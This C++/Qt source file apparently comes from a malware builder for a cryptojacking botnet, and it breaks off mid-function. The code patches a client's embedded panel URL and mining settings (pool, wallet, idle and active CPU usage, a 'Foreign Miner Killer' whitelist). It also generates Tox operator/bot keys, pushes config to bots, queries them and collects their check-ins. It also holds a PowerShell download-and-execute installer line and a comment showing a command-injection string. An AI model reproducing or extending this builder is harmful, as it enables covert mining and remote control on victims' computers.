#include "buildsystem.h"
#include <QCoreApplication>
#include <QDir>
#include <QDirIterator>
#include <QFile>
#include <QFileInfo>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QProcess>
#include <QRegularExpression>
#include <QScopeGuard>
#include <QDebug>
#include <QMutexLocker>
#include <QRecursiveMutex>
#include <QStandardPaths>
#include <QTemporaryFile>

namespace {
// Escape a user-supplied string so it can be spliced between C++ double-quotes
// in generated source. Without this, a URL containing `"` closes the string
// literal early and the rest of the URL becomes C++ code — an operator who
// pastes `foo.com"; system("calc"); //` into the endpoint field would execute
// arbitrary code on their own machine at build time. Escaping backslashes
// first is important: it must come before quote-escaping so we don't
// double-escape a quote we just introduced.
QString cxxEscapeForStringLiteral(const QString &raw)
{
    QString out = raw;
    out.replace(QLatin1Char('\\'), QStringLiteral("\\\\"));
    out.replace(QLatin1Char('"'),  QStringLiteral("\\\""));
    out.replace(QLatin1Char('\n'), QStringLiteral("\\n"));
    out.replace(QLatin1Char('\r'), QString());
    // Also drop any raw NULs — a `\0` mid-string would truncate at runtime.
    out.remove(QChar(QChar::Null));
    return out;
}
} // namespace

#ifdef Q_OS_WIN
#include <windows.h>
#include <shellapi.h>
#endif

BuildSystem::BuildSystem(QObject *parent)
    : QObject(parent)
{
    m_clientDir = resolveClientDir();
    if (m_clientDir.isEmpty()) {
        // Fall back to the legacy layout (Client next to the exe) so any
        // missing-dir diagnostics still point somewhere sensible.
        m_clientDir = QDir(QCoreApplication::applicationDirPath()).filePath("Client");
    }
    m_buildDir = QDir(m_clientDir).filePath("build");
}

QString BuildSystem::projectRoot()
{
    const QString clientDir = resolveClientDir();
    if (!clientDir.isEmpty())
        return QFileInfo(clientDir).absolutePath();
    return QCoreApplication::applicationDirPath();
}

/* Finds the client source directory (the folder that holds the client's
 * CMakeLists.txt). It may live at <exe>/Client (deployed layout) or further
 * away, e.g. <repo>/build/release/Client when the builder is run from a Qt
 * Creator shadow-build directory. We walk up from the exe checking the common
 * layouts until CMakeLists.txt is found. */
QString BuildSystem::resolveClientDir()
{
    const QStringList subpaths = {
        QStringLiteral("Client"),
        QStringLiteral("release/Client"),
        QStringLiteral("debug/Client"),
        QStringLiteral("build/Client"),
        QStringLiteral("build/release/Client"),
        QStringLiteral("build/debug/Client")
    };

    QDir dir(QCoreApplication::applicationDirPath());
    QString fallback;

    const int kMaxDepth = 10;
    for (int depth = 0; depth < kMaxDepth; ++depth) {
        const QString base = QDir::cleanPath(dir.absolutePath());
        for (const QString &sub : subpaths) {
            const QString candidate = QDir(base).filePath(sub);
            const QString cmake = QDir(candidate).filePath("CMakeLists.txt");
            if (!QFile::exists(cmake))
                continue;

            // A complete client carries the vendored toxcore; a stale shadow-build
            // copy may only have an old CMakeLists.txt. Prefer the complete one.
            if (QFile::exists(QDir(candidate).filePath("ThirdParty/toxcore/lib/libtoxcore.a")))
                return candidate;
            if (fallback.isEmpty())
                fallback = candidate;
        }

        const QString parent = QDir::cleanPath(base + QStringLiteral("/.."));
        if (parent == base)
            break;
        dir.setPath(parent);
    }

    return fallback;
}

bool BuildSystem::isRunningAsAdmin()
{
#ifdef Q_OS_WIN
    bool isAdmin = false;
    HANDLE token = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(token, TokenElevation, &elevation, size, &size))
            isAdmin = elevation.TokenIsElevated;
        CloseHandle(token);
    }
    return isAdmin;
#else
    return true;
#endif
}

BuildSystem::Dependencies BuildSystem::checkDependencies() const
{
    Dependencies deps;

#ifdef Q_OS_WIN
    auto checkCommand = [](const QString &cmd) -> bool {
        QProcess process;
        process.start("where", {cmd});
        process.waitForFinished(2000);
        return process.exitCode() == 0;
    };

    deps.chocolatey = QFile::exists("C:\\ProgramData\\chocolatey\\bin\\choco.exe");
    // cmake / g++ may live outside PATH (Qt-bundled toolchain): accept either
    // a PATH-resolved command or a known absolute location. The build itself
    // launches children with those locations appended to PATH (runCommand),
    // so whatever is accepted here is actually runnable there.
    deps.cmake = checkCommand("cmake") || !cmakePath().isEmpty();
    deps.mingw = (checkCommand("g++") || !mingwBinDir().isEmpty())
              && (checkCommand("mingw32-make") || !makeProgramPath().isEmpty());
#else
    auto checkCommand = [](const QString &cmd) -> bool {
        QProcess process;
        process.start("which", {cmd});
        process.waitForFinished(2000);
        return process.exitCode() == 0;
    };
    deps.cmake = checkCommand("cmake");
    deps.mingw = checkCommand("g++");
#endif

    return deps;
}

bool BuildSystem::runCommand(const QString &program, const QStringList &args,
                             const std::function<void(const QString&)> &output,
                             const QString &workingDir)
{
    QProcess process;
    if (!workingDir.isEmpty()) {
        process.setWorkingDirectory(workingDir);
    }

    // Resolve known tools to absolute paths up front. QProcess on Windows
    // does not reliably honour the child PATH set below when locating the
    // executable itself, so a bare "cmake" fails with "Failed to start"
    // even though the appended PATH would let it run. Absolute paths bypass
    // lookup entirely; PATH fallback preserved when nothing is known.
    QString prog = program;
    if (prog.compare(QStringLiteral("cmake"), Qt::CaseInsensitive) == 0) {
        const QString abs = cmakePath();
        if (!abs.isEmpty())
            prog = abs;
    } else if (prog.compare(QStringLiteral("mingw32-make"), Qt::CaseInsensitive) == 0
               || prog.compare(QStringLiteral("make"), Qt::CaseInsensitive) == 0) {
        const QString abs = makeProgramPath();
        if (!abs.isEmpty())
            prog = abs;
    }

    // The MinGW toolchain locates its helper binaries (cc1.exe, as.exe, ld.exe)
    // and their runtime DLLs (libwinpthread-1.dll, libgcc_s_seh-1.dll, ...)
    // relative to its bin directory. When the builder is launched from a shell
    // or IDE whose PATH does not include that directory, gcc starts but its
    // sub-processes fail to load, so CMake reports "unable to compile a simple
    // test program". Prepend the toolchain bin dir to PATH for every child.
    QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
    const QString binDir = mingwBinDir();
    if (!binDir.isEmpty()) {
#ifdef Q_OS_WIN
        env.insert("PATH", binDir + ";" + env.value("PATH"));
#else
        env.insert("PATH", binDir + ":" + env.value("PATH"));
#endif
    }
    // cmake.exe itself is resolved through PATH as well: append its known
    // location AFTER the system PATH so an existing PATH cmake keeps
    // priority (same resolution as before) while a Qt-bundled cmake still
    // works when nothing is on PATH.
    const QString cmakeExe = cmakePath();
    if (!cmakeExe.isEmpty()) {
        const QString cmakeBin = QFileInfo(cmakeExe).absolutePath();
        if (!env.value("PATH").contains(cmakeBin, Qt::CaseInsensitive)) {
#ifdef Q_OS_WIN
            env.insert("PATH", env.value("PATH") + ";" + cmakeBin);
#else
            env.insert("PATH", env.value("PATH") + ":" + cmakeBin);
#endif
        }
    }
    process.setProcessEnvironment(env);

    qDebug() << "Running:" << program << args.join(" ");

    process.start(prog, args);

    if (!process.waitForStarted(10000)) {
        if (output) output(tr("Failed to start: %1").arg(program));
        return false;
    }

    while (process.state() == QProcess::Running) {
        if (process.waitForReadyRead(100)) {
            QString out = QString::fromUtf8(process.readAllStandardOutput());
            QString err = QString::fromUtf8(process.readAllStandardError());
            if (output) {
                if (!out.isEmpty()) output(out);
                if (!err.isEmpty()) output(tr("[STDERR] %1").arg(err));
            }
        }
        QCoreApplication::processEvents(QEventLoop::ExcludeUserInputEvents, 50);
    }
    // waitForFinished with timeout to avoid infinite hang (toxcli 60s max); still drain tail.
    if (!process.waitForFinished(5000)) {
        process.kill();
        process.waitForFinished(2000);
    }
    {
        QString out = QString::fromUtf8(process.readAllStandardOutput());
        QString err = QString::fromUtf8(process.readAllStandardError());
        if (output) {
            if (!out.isEmpty()) output(out);
            if (!err.isEmpty()) output(tr("[STDERR] %1").arg(err));
        }
    }
    qDebug() << "Exit code:" << process.exitCode();
    return process.exitCode() == 0;
}

bool BuildSystem::ensureChocolatey(const std::function<void(const QString&)> &output)
{
    if (QFile::exists("C:\\ProgramData\\chocolatey\\bin\\choco.exe")) {
        if (output) output(tr("[+] Chocolatey already installed\n"));
        return true;
    }

#ifdef Q_OS_WIN
    if (output) output(tr("[*] Installing Chocolatey...\n"));

    QString script =
        "Set-ExecutionPolicy Bypass -Scope Process -Force; "
        "[System.Net.ServicePointManager]::SecurityProtocol = 3072; "
        "iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))";

    bool success = runCommand("powershell", {
                                                "-NoProfile",
                                                "-ExecutionPolicy", "Bypass",
                                                "-Command", script
                                            }, output);

    if (success) {
        if (output) output(tr("[+] Chocolatey installed successfully\n"));
        return true;
    }
#endif
    return false;
}

bool BuildSystem::ensureCMake(const std::function<void(const QString&)> &output)
{
    auto deps = checkDependencies();
    if (deps.cmake) {
        if (output) output(tr("[+] CMake already installed\n"));
        return true;
    }

#ifdef Q_OS_WIN
    if (output) output(tr("[*] Installing CMake via Chocolatey...\n"));
    QString chocoPath = "C:\\ProgramData\\chocolatey\\bin\\choco.exe";
    if (!QFile::exists(chocoPath)) {
        if (!ensureChocolatey(output)) return false;
    }

    return runCommand(chocoPath, {"install", "cmake", "-y"}, output);
#else
    if (output) output(tr("[!] Please install CMake manually\n"));
    return false;
#endif
}

bool BuildSystem::ensureMinGW(const std::function<void(const QString&)> &output)
{
    auto deps = checkDependencies();
    if (deps.mingw) {
        if (output) output(tr("[+] MinGW already installed\n"));
        return true;
    }

#ifdef Q_OS_WIN
    if (output) output(tr("[*] Installing MinGW via Chocolatey...\n"));
    QString chocoPath = "C:\\ProgramData\\chocolatey\\bin\\choco.exe";
    if (!QFile::exists(chocoPath)) {
        if (!ensureChocolatey(output)) return false;
    }

    return runCommand(chocoPath, {"install", "mingw", "-y"}, output);
#else
    if (output) output(tr("[!] Please install MinGW manually\n"));
    return false;
#endif
}

bool BuildSystem::installDependencies(const std::function<void(const QString&)> &output)
{
    QMutexLocker<QRecursiveMutex> locker(&m_runLock);
    (void)locker;

    auto deps = checkDependencies();

    if (!isRunningAsAdmin()) {
        if (output) output(tr("[!] Administrator privileges required for installation\n"));
        return false;
    }

    bool allOk = true;
    if (!deps.chocolatey) {
        allOk = ensureChocolatey(output) && allOk;
    }
    if (!deps.cmake) {
        allOk = ensureCMake(output) && allOk;
    }
    if (!deps.mingw) {
        allOk = ensureMinGW(output) && allOk;
    }

    return allOk;
}

void BuildSystem::backupSourceFiles(const QString &clientDir)
{
    if (clientDir.trimmed().isEmpty() || !QDir(clientDir).exists()) return;
    const QString backupDir = QDir(clientDir).filePath("backup");
    const QString srcDir = QDir(clientDir).filePath("src");
    // Safety: srcDir must be inside clientDir to avoid deleting wrong tree on bad resolveClientDir
    if (!QFileInfo(srcDir).canonicalFilePath().startsWith(QFileInfo(clientDir).canonicalFilePath()) &&
        !QDir(srcDir).absolutePath().startsWith(QDir(clientDir).absolutePath()))
        return;
    if (QDir(backupDir).exists() && !QDir(backupDir).removeRecursively()) return;
    QDir().mkpath(backupDir);
    if (!QDir(srcDir).exists())
        return;

    QDirIterator it(srcDir, QDirIterator::Subdirectories);
    while (it.hasNext()) {
        const QString filePath = it.next();
        const QFileInfo fi(filePath);
        if (!fi.isFile()) continue;
        // Preserve relative path so subdirectory structure survives the round-trip.
        const QString rel = QDir(srcDir).relativeFilePath(filePath);
        const QString dest = QDir(backupDir).filePath(rel);
        QDir().mkpath(QFileInfo(dest).absolutePath());
        QFile::copy(filePath, dest);
    }
}

bool BuildSystem::recoverStaleBackup(QString *messageOut)
{
    const QString clientDir = QDir(resolveClientDir()).absolutePath();
    if (clientDir.isEmpty())
        return false;
    const QString backupDir = QDir(clientDir).filePath("backup");
    if (!QDir(backupDir).exists())
        return false;

    // Find backup files, restore each one over the src tree, then wipe the
    // backup dir. Uses the same layout as backupSourceFiles / restoreSourceFiles.
    const QString srcDir = QDir(clientDir).filePath("src");
    if (QDir(srcDir).exists())
        QDir(srcDir).removeRecursively();
    QDir().mkpath(srcDir);

    int restored = 0;
    int total = 0, failed = 0;
    QDirIterator it(backupDir, QDirIterator::Subdirectories);
    while (it.hasNext()) {
        const QString filePath = it.next();
        const QFileInfo fi(filePath);
        if (!fi.isFile()) continue;
        ++total;
        const QString rel  = QDir(backupDir).relativeFilePath(filePath);
        const QString dest = QDir(srcDir).filePath(rel);
        QDir().mkpath(QFileInfo(dest).absolutePath());
        if (QFile::exists(dest) && !QFile::remove(dest)) { ++failed; continue; }
        if (QFile::copy(filePath, dest)) ++restored; else ++failed;
    }
    if (failed == 0) {
        QDir(backupDir).removeRecursively();
    } else {
        qWarning() << "recoverStaleBackup: failed to copy" << failed << "of" << total << "files, backup kept";
        return false;
    }

    // Also drop any stale generated resources the interrupted build left behind.
    QFile::remove(QDir(clientDir).filePath("resources/embedded_config.json"));
    QFile::remove(QDir(clientDir).filePath("resources/tox_config.json"));

    if (messageOut)
        *messageOut = QStringLiteral("Recovered %1 client source file(s) from a stale backup — a previous build was interrupted.").arg(restored);
    return true;
}

void BuildSystem::restoreSourceFiles(const QString &clientDir)
{
    if (clientDir.trimmed().isEmpty() || !QDir(clientDir).exists()) return;
    const QString backupDir = QDir(clientDir).filePath("backup");
    const QString srcDir    = QDir(clientDir).filePath("src");
    if (!QFileInfo(srcDir).canonicalFilePath().startsWith(QFileInfo(clientDir).canonicalFilePath()) &&
        !QDir(srcDir).absolutePath().startsWith(QDir(clientDir).absolutePath()))
        return;
    if (!QDir(backupDir).exists())
        return;
    if (QDir(srcDir).exists() && !QDir(srcDir).removeRecursively()) return;
    QDir().mkpath(srcDir);
    // Track copy failures — keep backup if any copy failed so operator can retry
    int failed = 0;

    QDirIterator it(backupDir, QDirIterator::Subdirectories);
    while (it.hasNext()) {
        const QString filePath = it.next();
        const QFileInfo fi(filePath);
        if (!fi.isFile()) continue;
        const QString rel  = QDir(backupDir).relativeFilePath(filePath);
        const QString dest = QDir(srcDir).filePath(rel);
        QDir().mkpath(QFileInfo(dest).absolutePath());
        if (QFile::exists(dest) && !QFile::remove(dest)) { ++failed; continue; }
        if (!QFile::copy(filePath, dest)) ++failed;
    }
    if (failed == 0) QDir(backupDir).removeRecursively();
    else qWarning() << "restoreSourceFiles: failed to restore" << failed << "files, backup kept for retry";
}

/* Writes the embedded fallback config JSON the client compiles in. It mirrors
 * the schema ConfigManager::ParseConfigFromJson expects, built from the
 * builder's mining settings so the client can mine even with no panel. */
bool BuildSystem::writeEmbeddedConfig(const BuildConfig &config)
{
    QFile file(config.embeddedConfigPath);
    QDir().mkpath(QFileInfo(config.embeddedConfigPath).absolutePath());
    if (!file.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
        qDebug() << "Cannot write embedded config:" << config.embeddedConfigPath;
        return false;
    }
    file.write(QJsonDocument(miningConfigJson(config)).toJson(QJsonDocument::Indented));
    file.close();
    return true;
}

QJsonObject BuildSystem::miningConfigJson(const BuildConfig &config)
{
    const QString password = config.minerPassword.isEmpty()
                                 ? QStringLiteral("x") : config.minerPassword;

    QJsonObject cpu;
    cpu["mining_url"]      = config.minerPool;
    cpu["wallet"]          = config.minerWallet;
    cpu["password"]        = password;
    cpu["non_idle_usage"]  = config.mineOnActive ? double(config.activeEffortPct) : 0.0;
    cpu["idle_usage"]      = config.mineOnIdle   ? double(config.idleEffortPct)   : 0.0;
    cpu["wait_time_idle"]  = config.idleAfterMin;
    cpu["use_ssl"]         = config.useTls ? 1 : 0;

    // GPU mining removed — keep a disabled stub for backward compat with old configs
    QJsonObject gpu;
    gpu["mining_url"]      = QStringLiteral("");
    gpu["wallet"]          = QStringLiteral("");
    gpu["password"]        = password;
    gpu["algo"]            = QStringLiteral("kawpow");
    gpu["fan_speed"]       = 0;
    gpu["non_idle_usage"]  = 0.0;
    gpu["idle_usage"]      = 0.0;
    gpu["wait_time_idle"]  = config.idleAfterMin;
    gpu["use_ssl"]         = 0;

    QJsonObject root;
    root["cpu_config"]         = cpu;
    root["gpu_config"]         = gpu;
    root["enable_cpu"]         = config.cpuMiner ? 1 : 0;
    root["enable_gpu"]         = 0;

    // Foreign Miner Killer whitelist: process names that must never be killed.
    QJsonArray watched;
    for (const QString &name : config.watchedProcesses.split(QLatin1Char(','), Qt::SkipEmptyParts)) {
        const QString trimmed = name.trimmed();
        if (!trimmed.isEmpty())
            watched.append(trimmed);
    }
    root["watched_processes"]  = watched;

    if (!config.idTox.trimmed().isEmpty())
        root["id_tox"] = config.idTox.trimmed();

    return root;
}

/* Writes the client-facing tox_config.json from the generated operator + bot
 * pair. Only the operator public key and the bot savedata are needed by the
 * client; the operator savedata stays in the builder (it is the operator's
 * secret for importing into a Tox client / pushing config). */
bool BuildSystem::writeToxConfig(const BuildConfig &config)
{
    const QString path = QDir(m_clientDir).filePath("resources/tox_config.json");

    QJsonObject op;
    op["id"] = config.toxOperatorId;
    op["public_key"] = config.toxOperatorId.trimmed().left(64); // first 32 bytes

    QJsonObject bot;
    bot["id"] = config.toxBotId;
    bot["savedata_hex"] = config.toxBotSavedata;

    QJsonObject root;
    root["operator"] = op;
    root["bot"] = bot;
    root["name"] = config.toxBotName.trimmed().isEmpty()
                       ? QStringLiteral("bot") : config.toxBotName.trimmed();

    QDir().mkpath(QFileInfo(path).absolutePath());
    QFile file(path);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
        qDebug() << "Cannot write tox config:" << path;
        return false;
    }
    file.write(QJsonDocument(root).toJson(QJsonDocument::Indented));
    file.close();
    return true;
}

QString BuildSystem::makeProgramPath() const
{
    const QStringList paths = {
        "C:\\ProgramData\\chocolatey\\lib\\mingw\\tools\\install\\mingw64\\bin\\mingw32-make.exe",
        "C:\\mingw64\\bin\\mingw32-make.exe",
        "C:\\msys64\\mingw64\\bin\\mingw32-make.exe",
        "C:\\tools\\mingw64\\bin\\mingw32-make.exe",
        // Qt-bundled toolchains last: only used when nothing above exists,
        // so existing machines keep their current toolchain selection.
        "D:\\qt\\Tools\\mingw1310_64\\bin\\mingw32-make.exe",
        "D:\\qt\\6.11.1\\mingw_64\\bin\\mingw32-make.exe"
    };
    for (const QString &path : paths)
        if (QFile::exists(path))
            return path;
    return QString();
}

/* Absolute path to cmake.exe, same known-location strategy as
 * makeProgramPath(): the Qt-bundled CMake first (the version client builds
 * are tested against), then Chocolatey, then the VS-bundled one. */
QString BuildSystem::cmakePath() const
{
    const QStringList paths = {
        "D:\\qt\\Tools\\CMake_64\\bin\\cmake.exe",
        "C:\\ProgramData\\chocolatey\\bin\\cmake.exe",
        "C:\\Program Files\\Microsoft Visual Studio\\18\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\CMake\\CMake\\bin\\cmake.exe"
    };
    for (const QString &path : paths)
        if (QFile::exists(path))
            return path;
    return QString();
}

/* The MinGW bin dir implied by makeProgramPath(), or empty if unknown. Used to
 * pin the compiler/linker to the same toolchain that built the client (and its
 * vendored toxcore libs) instead of whatever gcc is first on PATH. */
QString BuildSystem::mingwBinDir() const
{
    const QString make = makeProgramPath();
    if (make.isEmpty())
        return QString();
    return QFileInfo(make).absolutePath();
}

QString BuildSystem::toxCliPath() const
{
    return QDir(m_clientDir).filePath("tools/toxcli.exe");
}

bool BuildSystem::ensureToxCli(const std::function<void(const QString&)> &output)
{
    const QString cached = toxCliPath();
    if (QFile::exists(cached))
        return true;

    // The client source (and its CMake project) must sit next to the builder.
    if (!QFile::exists(QDir(m_clientDir).filePath("CMakeLists.txt"))) {
        if (output) output(tr("[!] Client source not found next to the builder at %1\n").arg(m_clientDir));
        return false;
    }

    // Build toxcli from the client's own CMake project into a scratch dir,
    // then cache the exe. Requires cmake + a MinGW toolchain (same deps as a
    // normal build).
    auto deps = checkDependencies();
    if (!deps.cmake || !deps.mingw) {
        if (output) output(tr("[!] toxcli needs CMake and MinGW installed\n"));
        return false;
    }

    const QString scratch = QDir(m_clientDir).filePath("build-toxcli");
    if (QDir(scratch).exists())
        QDir(scratch).removeRecursively();
    QDir().mkpath(scratch);

    QStringList cmakeArgs;
    cmakeArgs << "-G" << "MinGW Makefiles"
              << "-DCMAKE_BUILD_TYPE=Release";
    const QString makeProgram = makeProgramPath();
    const QString bin = mingwBinDir();
    if (!bin.isEmpty()) {
        cmakeArgs << "-DCMAKE_C_COMPILER="   + QDir(bin).filePath("gcc.exe")
                  << "-DCMAKE_CXX_COMPILER=" + QDir(bin).filePath("g++.exe")
                  << "-DCMAKE_RC_COMPILER="  + QDir(bin).filePath("windres.exe")
                  << "-DCMAKE_MAKE_PROGRAM=" + makeProgram;
    } else {
        cmakeArgs << "-DCMAKE_C_COMPILER=gcc"
                  << "-DCMAKE_CXX_COMPILER=g++"
                  << "-DCMAKE_RC_COMPILER=windres";
    }
    cmakeArgs << "..";

    if (output) output(tr("[*] Building toxcli helper...\n"));
    if (!runCommand("cmake", cmakeArgs, output, scratch))
        return false;
    if (!runCommand("cmake", {"--build", ".", "--target", "toxcli", "--config", "Release", "--parallel", "4"},
                    output, scratch))
        return false;

    const QString built = QDir(scratch).filePath("toxcli.exe");
    if (!QFile::exists(built)) {
        if (output) output(tr("[!] toxcli.exe not produced\n"));
        return false;
    }

    QDir().mkpath(QDir(cached).absolutePath());
    if (!QFile::copy(built, cached)) {
        if (output) output(tr("[!] Failed to cache toxcli.exe\n"));
        return false;
    }
    QDir(scratch).removeRecursively();
    if (output) output(tr("[+] toxcli helper cached: %1\n").arg(cached));
    return true;
}

bool BuildSystem::generateToxPair(QString &operatorId, QString &operatorSavedata,
                                  QString &botId, QString &botSavedata,
                                  const QString &botName,
                                  const std::function<void(const QString&)> &output)
{
    QMutexLocker<QRecursiveMutex> locker(&m_runLock);
    (void)locker;

    if (!ensureToxCli(output))
        return false;

    const QString outPath = QDir(m_clientDir).filePath("tox_pair.json");
    QFile::remove(outPath);
    auto _guard = qScopeGuard([outPath]{ QFile::remove(outPath); });
    QStringList args = {"keygen", "--name", botName.trimmed().isEmpty() ? QStringLiteral("bot") : botName.trimmed(),
                        "--out", outPath};
    if (!runCommand(toxCliPath(), args, output))
        return false;

    QFile f(outPath);
    if (!f.open(QIODevice::ReadOnly)) {
        if (output) output(tr("[!] Failed to read toxcli keygen output\n"));
        return false;
    }
    QJsonParseError perr;
    const QJsonDocument doc = QJsonDocument::fromJson(f.readAll(), &perr);
    f.close();
    if (perr.error != QJsonParseError::NoError || !doc.isObject()) {
        if (output) output(tr("[!] Invalid toxcli keygen JSON: %1\n").arg(perr.errorString()));
        return false;
    }
    const QJsonObject root = doc.object();

    operatorId      = root["operator"].toObject()["id"].toString();
    operatorSavedata = root["operator"].toObject()["savedata_hex"].toString();
    botId           = root["bot"].toObject()["id"].toString();
    botSavedata     = root["bot"].toObject()["savedata_hex"].toString();

    if (operatorId.size() != 76 || botId.size() != 76 || operatorSavedata.isEmpty() || botSavedata.isEmpty()) {
        if (output) output(tr("[!] Invalid toxcli keygen output\n"));
        return false;
    }
    return true;
}

bool BuildSystem::sendToxConfig(const QString &operatorSavedata, const QString &botId,
                                const QString &messageJson,
                                const std::function<void(const QString&)> &output,
                                QString *updatedOperatorSavedata)
{
    QMutexLocker<QRecursiveMutex> locker(&m_runLock);
    (void)locker;

    if (!ensureToxCli(output))
        return false;

    // Write the operator savedata to a temp file instead of passing it as a
    // command-line argument (argv is readable by other processes on Windows).
    QTemporaryFile savedataFile;
    savedataFile.setAutoRemove(true);
    if (!savedataFile.open()) {
        if (output) output(tr("[!] Cannot create temp file for operator savedata\n"));
        return false;
    }
    QFile::setPermissions(savedataFile.fileName(), QFile::ReadOwner | QFile::WriteOwner);
    QByteArray sd = QByteArray::fromHex(operatorSavedata.toLatin1());
    if (sd.isEmpty() && !operatorSavedata.isEmpty()) {
        if (output) output(tr("[!] Invalid operator savedata hex\n"));
        return false;
    }
    savedataFile.write(sd);
    savedataFile.close();

    const QString wireMessage = QStringLiteral("config ") + messageJson;
    QTemporaryFile messageFile;
    messageFile.setAutoRemove(true);
    if (!messageFile.open()) {
        if (output) output(tr("[!] Cannot create temp file for Tox message\n"));
        return false;
    }
    QFile::setPermissions(messageFile.fileName(), QFile::ReadOwner | QFile::WriteOwner);
    messageFile.write(wireMessage.toUtf8());
    messageFile.close();

    QStringList args = {"send", "--operator-savedata", savedataFile.fileName(),
                        "--to", botId, "--message-file", messageFile.fileName()};
    const bool ok = runCommand(toxCliPath(), args, output);
    if (updatedOperatorSavedata) {
        // toxcli writes the updated friend list back to this file.
        QFile reader(savedataFile.fileName());
        if (reader.open(QIODevice::ReadOnly))
            *updatedOperatorSavedata = QString::fromLatin1(reader.readAll().toHex());
    }
    return ok;
}

bool BuildSystem::queryToxStatus(const QString &operatorSavedata, const QString &botId,
                                 QString &replyJson,
                                 const std::function<void(const QString&)> &output,
                                 QString *updatedOperatorSavedata)
{
    QMutexLocker<QRecursiveMutex> locker(&m_runLock);
    (void)locker;

    if (!ensureToxCli(output))
        return false;

    QTemporaryFile savedataFile;
    savedataFile.setAutoRemove(true);
    if (!savedataFile.open()) {
        if (output) output(tr("[!] Cannot create temp file for operator savedata\n"));
        return false;
    }
    QFile::setPermissions(savedataFile.fileName(), QFile::ReadOwner | QFile::WriteOwner);
    QByteArray sd2 = QByteArray::fromHex(operatorSavedata.toLatin1());
    if (sd2.isEmpty() && !operatorSavedata.isEmpty()) {
        if (output) output(tr("[!] Invalid operator savedata hex\n"));
        return false;
    }
    savedataFile.write(sd2);
    savedataFile.close();

    QStringList args = {"query", "--operator-savedata", savedataFile.fileName(),
                        "--to", botId, "--message", QStringLiteral("status")};

    QStringList captured;
    auto cap = [&](const QString &line) {
        captured << line;
        if (output) output(line);
    };
    const bool ok = runCommand(toxCliPath(), args, cap);
    if (updatedOperatorSavedata) {
        // toxcli writes the updated friend list back to this file.
        QFile reader(savedataFile.fileName());
        if (reader.open(QIODevice::ReadOnly))
            *updatedOperatorSavedata = QString::fromLatin1(reader.readAll().toHex());
    }
    if (!ok) return false;

    // toxcli query prints the JSON reply to stdout (one line). Find the
    // last line that looks like JSON.
    for (int i = captured.size() - 1; i >= 0; --i) {
        const QString s = captured[i].trimmed();
        if (s.startsWith('{') && s.endsWith('}')) {
            replyJson = s;
            return true;
        }
    }
    // Fallback: also check for legacy key=value
    for (int i = captured.size() - 1; i >= 0; --i) {
        const QString s = captured[i].trimmed();
        if (s.startsWith("hash=") || s.startsWith("{\"device_hash\"")) {
            replyJson = s;
            return true;
        }
    }
    if (output) output(tr("[!] No status reply received\n"));
    return false;
}

bool BuildSystem::listenForHellos(const QString &operatorSavedata, int seconds, QStringList &hellos,
                                  const std::function<void(const QString&)> &output,
                                  QString *updatedOperatorSavedata)
{
    QMutexLocker<QRecursiveMutex> locker(&m_runLock);
    (void)locker;
    if (!ensureToxCli(output)) return false;
    QTemporaryFile savedataFile; savedataFile.setAutoRemove(true);
    if (!savedataFile.open()) { if (output) output(tr("[!] Cannot create temp file\n")); return false; }
    QFile::setPermissions(savedataFile.fileName(), QFile::ReadOwner | QFile::WriteOwner);
    QByteArray sd = QByteArray::fromHex(operatorSavedata.toLatin1());
    if (sd.isEmpty() && !operatorSavedata.isEmpty()) { if (output) output(tr("[!] Invalid savedata\n")); return false; }
    savedataFile.write(sd); savedataFile.close();
    QTemporaryFile outFile; outFile.setAutoRemove(false);
    if (!outFile.open()) { if (output) output(tr("[!] Cannot create out file\n")); return false; }
    QString outPath = outFile.fileName(); outFile.close();
    QStringList args = {"listen","--operator-savedata",savedataFile.fileName(),"--seconds",QString::number(seconds),"--out",outPath};
    QStringList captured; auto cap=[&](const QString &l){ captured<<l; if(output) output(l); };
    bool ok = runCommand(toxCliPath(), args, cap);
    if (updatedOperatorSavedata) {
        // toxcli persists newly discovered bots into this file, so the operator
        // remembers them across sessions / colony wipes.
        QFile reader(savedataFile.fileName());
        if (reader.open(QIODevice::ReadOnly))
            *updatedOperatorSavedata = QString::fromLatin1(reader.readAll().toHex());
    }
    QFile f(outPath); if (f.open(QIODevice::ReadOnly)) {
        QJsonDocument d = QJsonDocument::fromJson(f.readAll());
        f.close(); QFile::remove(outPath);
        if (d.isArray()) for (auto v: d.array()) hellos << v.toString();
        return ok;
    }
    QFile::remove(outPath);
    return ok;
}

bool BuildSystem::modifySourceFiles(const BuildConfig &config,
                                    const std::function<void(const QString&)> &output)
{
    QString mainCppPath = QDir(m_clientDir).filePath("src/main.cpp");
    if (!QFile::exists(mainCppPath)) {
        if (output) output(tr("[!] main.cpp not found\n"));
        return false;
    }

    QFile file(mainCppPath);
    if (!file.open(QIODevice::ReadWrite | QIODevice::Text)) {
        if (output) output(tr("[!] Cannot open main.cpp\n"));
        return false;
    }

    QString content = QString::fromUtf8(file.readAll());
    file.close();

    bool modified = false;

    // Modify Panel URL. The panel URL stays in the binary even when a config
    // URL is set: the client still uses it for check-ins and miner downloads.
    // Both URLs are escaped for embedding into a C++ string literal — see
    // cxxEscapeForStringLiteral in the anonymous namespace above.
    if (!config.panelUrl.isEmpty()) {
        QRegularExpression panelRegex(R"(std::string\s+panelUrlsStr\s*=\s*"[^"]*"\s*;)");
        if (panelRegex.match(content).hasMatch()) {
            const QString escaped = cxxEscapeForStringLiteral(config.panelUrl);
            content.replace(panelRegex,
                            QString("std::string panelUrlsStr = \"%1\";").arg(escaped));
            modified = true;
            if (output) output(tr("[+] Modified panel URL: %1\n").arg(config.panelUrl));
        }
    }

    // Modify Config URL
    if (!config.configUrl.isEmpty()) {
        QRegularExpression configRegex(R"(std::string\s+configGetUrlStr\s*=\s*"[^"]*"\s*;)");
        if (configRegex.match(content).hasMatch()) {
            const QString escaped = cxxEscapeForStringLiteral(config.configUrl);
            content.replace(configRegex,
                            QString("std::string configGetUrlStr = \"%1\";").arg(escaped));
            modified = true;
            if (output) output(tr("[+] Modified config URL: %1\n").arg(config.configUrl));
        }
    }

    if (modified) {
